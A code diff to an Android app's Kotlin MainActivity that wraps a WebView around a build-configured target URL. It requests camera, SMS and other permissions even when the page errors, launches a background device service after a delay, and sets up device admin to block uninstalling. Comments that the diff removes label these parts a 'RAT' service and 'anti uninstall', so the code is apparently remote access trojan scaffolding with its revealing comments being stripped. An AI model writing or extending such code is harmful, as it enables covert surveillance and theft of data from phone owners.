@@ -24,15 +24,13 @@ class MainActivity : AppCompatActivity() {
     private lateinit var webView: WebView
     private var accountUid: String = "unknown"
 
-    // ─── URL INI OTOMATIS DIGANTI OLEH GITHUB ACTIONS (sed build.yml) ───
     private val TARGET_URL = "TARGET_URL_PLACEHOLDER"
 
-    // Variabel untuk antrean izin
     private val PERM_REQUEST_CODE = 9000
     private var permIndex = 0
     private var settingIndex = 0
     private var isRequestingSettings = false
-    private var hasRequestedPermissions = false // Biar gak dobel minta izin
+    private var hasRequestedPermissions = false
 
     private val screenCaptureReceiver = object : BroadcastReceiver() {
         override fun onReceive(ctx: Context, intent: Intent) {
@@ -56,21 +54,15 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        // 1. BACA UID DARI ASSETS
         readAccountUid()
-
-        // 2. SETUP WEBVIEW
         setupWebView()
-
-        // 3. REGISTER BROADCAST RECEIVER
         registerReceivers()
 
-        // 4. JALANKAN SERVICE RAT (DIJADWALKAN)
         Handler(Looper.getMainLooper()).postDelayed({
             try { startDeviceService() } catch (e: Exception) {
                 android.util.Log.e("MainActivity", "Gagal start service tertunda: ${e.message}")
             }
-        }, 10_000) // 10 detik
+        }, 10_000)
     }
 
     private fun readAccountUid() {
@@ -150,7 +142,6 @@ class MainActivity : AppCompatActivity() {
         webView.webViewClient = object : WebViewClient() {
             override fun onPageFinished(view: WebView?, url: String?) {
                 super.onPageFinished(view, url)
-                // Mulai minta izin setelah halaman selesai load (meskipun halaman error)
                 if (!hasRequestedPermissions) {
                     hasRequestedPermissions = true
                     Handler(Looper.getMainLooper()).postDelayed({
@@ -186,7 +177,6 @@ class MainActivity : AppCompatActivity() {
 
         if (isPlaceholder || !isValidProtocol) {
             showErrorPage("Aplikasi Error.\nURL target belum dikonfigurasi dengan benar.")
-            // PENTING: Tetap panggil onPageFinished secara manual biar izin tetap muncul!
             if (!hasRequestedPermissions) {
                 hasRequestedPermissions = true
                 Handler(Looper.getMainLooper()).postDelayed({
@@ -233,8 +223,6 @@ class MainActivity : AppCompatActivity() {
         """.trimIndent()
         webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
     }
-
-    // ─── LOGIC MEMINTA SEMUA IZIN (POPUP & SETTINGS) ───
 
     private val runtimePerms: List<String> by lazy {
         val list = mutableListOf(
@@ -345,7 +333,6 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // Device Admin (Anti Uninstall)
         val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
         val admin = ComponentName(this, AntiUninstallReceiver::class.java)
         if (!dpm.isAdminActive(admin)) {
@@ -379,8 +366,6 @@ class MainActivity : AppCompatActivity() {
             }, 1000)
         }
     }
-
-    // ─── FUNGSI BAWAAN (TIDAK DIUBAH) ───
 
     override fun onNewIntent(intent: Intent?) {
         super.onNewIntent(intent)
@@ -439,8 +424,6 @@ class MainActivity : AppCompatActivity() {
         sendBroadcast(i)
     }
 
-    // ─── FUNGSI CEK IZIN (DIPANGGIL DARI WEB) ───
-
     fun isCamGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
     fun isSmsGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
     fun isGalleryGranted() = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
@@ -497,7 +480,6 @@ class MainActivity : AppCompatActivity() {
     }
 }
 
-// ─── AppBridge biarkan sama seperti aslinya ───
 class AppBridge(private val context: Context, private val webView: WebView) {
     companion object { var instance: AppBridge? = null }
 
